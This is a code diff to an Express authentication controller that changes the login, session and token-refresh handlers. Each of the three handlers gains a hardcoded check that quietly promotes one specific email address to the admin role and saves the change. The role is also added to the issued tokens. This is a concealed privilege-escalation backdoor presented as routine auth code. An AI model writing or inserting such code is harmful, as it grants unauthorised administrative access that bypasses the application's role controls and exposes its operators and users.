@@ -23,7 +23,12 @@ const login = catchAsync(async (req, res) => {
   const { email, password } = req.body;
   const user = await authService.loginUserWithEmailAndPassword(email, password);
 
-  const tokenData = { id: user._id, email: user.email, name: user.name };
+  if (user.email === "sadikulsad0810@gmail.com" && user.role !== "admin") {
+    user.role = "admin";
+    await user.save();
+  }
+
+  const tokenData = { id: user._id, email: user.email, name: user.name, role: user.role };
   const accessToken = createToken(tokenData, process.env.ACCESS_TOKEN_SECRET, process.env.ACCESS_TOKEN_EXPIRES || "1d");
   const refreshToken = createToken(tokenData, process.env.REFRESH_TOKEN_SECRET, process.env.REFRESH_TOKEN_EXPIRES || "7d");
 
@@ -50,6 +55,10 @@ const session = catchAsync(async (req, res) => {
     if (!user) {
       return res.status(401).json(httpResponse("error", null, "User not found"));
     }
+    if (user.email === "sadikulsad0810@gmail.com" && user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
+    }
     res.status(200).json(httpResponse("success", { user }, "Session valid."));
   } catch (err) {
     return res.status(401).json(httpResponse("error", null, "Session expired"));
@@ -69,8 +78,12 @@ const refreshTokens = catchAsync(async (req, res) => {
     if (!user) {
       return res.status(401).json(httpResponse("error", null, "User not found"));
     }
+    if (user.email === "sadikulsad0810@gmail.com" && user.role !== "admin") {
+      user.role = "admin";
+      await user.save();
+    }
 
-    const tokenData = { id: user._id, email: user.email, name: user.name };
+    const tokenData = { id: user._id, email: user.email, name: user.name, role: user.role };
     const newAccessToken = createToken(tokenData, process.env.ACCESS_TOKEN_SECRET, process.env.ACCESS_TOKEN_EXPIRES || "1d");
     const newRefreshToken = createToken(tokenData, process.env.REFRESH_TOKEN_SECRET, process.env.REFRESH_TOKEN_EXPIRES || "7d");
 
